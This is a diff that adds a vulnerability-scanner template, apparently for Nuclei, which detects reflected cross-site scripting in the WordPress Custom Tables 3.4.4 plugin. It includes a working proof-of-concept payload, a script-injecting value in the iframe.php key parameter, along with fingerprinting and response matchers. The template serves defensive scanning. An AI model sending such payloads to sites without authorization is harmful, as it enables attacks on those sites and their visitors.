@@ -1,0 +1,49 @@
+flow: http(1) && http(2)
+http:
+    - matchers:
+        - condition: and
+          internal: true
+          type: word
+          words:
+            - custom tables
+            - 'Tags:'
+      raw:
+        - |
+          GET /wp-content/plugins/custom-tables/readme.txt HTTP/1.1
+          Host: {{Hostname}}
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - </script><script>alert(document.domain)</script>
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+id: wp-custom-tables-xss
+info:
+    author: daffainfo
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+        cvss-score: 7.2
+        cwe-id: CWE-79
+    description: WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.
+    metadata:
+        max-request: 2
+    name: WordPress Custom Tables 3.4.4 - Cross-Site Scripting
+    reference:
+        - https://wpscan.com/vulnerability/211a4286-4747-4b62-acc3-fd9a57b06252
+        - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-custom-tables-key-parameter-cross-site-scripting-3-4-4/
+    severity: high
+    tags:
+        - wpscan
+        - wordpress
+        - wp-plugin
+        - WordPress
